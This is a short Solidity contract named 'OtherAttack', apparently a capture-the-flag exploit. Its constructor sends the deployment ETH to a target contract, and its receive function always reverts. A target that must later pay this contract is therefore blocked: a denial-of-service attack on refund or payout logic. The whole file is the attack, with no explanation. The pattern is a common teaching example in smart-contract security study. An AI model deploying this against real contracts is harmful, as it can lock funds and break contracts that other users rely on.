pragma solidity ^0.8.0;

contract OtherAttack{
    constructor(address _addr) public payable{
      (bool success,) = _addr.call{value: msg.value}("");  
    }
    receive() payable external{
        revert();
    }
}